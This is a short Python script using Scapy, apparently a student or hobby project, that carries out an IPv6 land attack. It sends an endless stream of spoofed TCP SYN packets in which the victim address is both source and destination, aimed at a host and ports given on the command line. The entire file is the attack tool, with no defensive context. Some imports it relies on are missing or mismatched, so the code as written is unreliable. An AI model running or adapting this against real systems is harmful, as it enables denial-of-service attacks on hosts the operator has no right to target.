#!/usr/bin/python
# Jack Cardwell
# February 26, 2018

# land.py creates an IPv6 land attack...sending a SYN-flood with src and dst set as the victim


from scapy.all import *
from sys import *
from math import *

def land():

    # get the argument from the command line
    if len(sys.argv)!=4:
        print("Error: Please enter the correct number of arguments.")
        print("Usage: ./land.py [VICTIM_IP] [PORT1] [PORT2]")
        exit(2)

    # at this point, the number of inputs is correct so craft the packet
    victim = sys.argv[1]
    port1 = int(sys.argv[2])
    port2 = int(sys.argv[3])

    ip = IPv6(src = victim, dst = victim)

    tcp = TCP(sport = port1, dport = port2, ack = 0, flags = 2)

    # continue until the user closes the program
    while True:

        tcp.seq = random.randint(0,2143298293)

        pkt = (ip/tcp)

        send(pkt)
        time.sleep(.05)

land()
